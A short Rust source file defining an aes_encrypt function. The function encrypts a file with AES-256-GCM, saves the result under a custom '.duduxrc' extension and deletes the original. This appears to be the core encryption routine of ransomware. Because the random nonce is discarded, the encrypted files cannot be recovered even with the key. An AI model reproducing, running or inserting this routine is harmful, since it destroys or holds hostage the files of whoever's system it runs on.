use std::{error::Error, fs::{metadata, read, read_dir, remove_file, write}, path::Path};

use aes_gcm::{
    aead::{Aead, OsRng}, AeadCore, Aes256Gcm, Key, KeyInit
};


pub fn aes_encrypt(path: String, key: [u8; 32] ) -> Result<(), Box<dyn Error + Send + Sync>> {

    let file_content = read(&path)?;
    
    if file_content.is_empty() {
        return Ok(())
    }

    let key_aes = Key::<Aes256Gcm>::from_slice(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);

    let cipher = Aes256Gcm::new(key_aes);

    let encrypted_text = cipher.encrypt(&nonce, file_content.as_ref())
        .expect("error in encrypt file :/");

    let path_file_enc = format!("{}.duduxrc",path);
    let _ = write(path_file_enc,&encrypted_text);
    let _ = remove_file(path);


Ok(())
}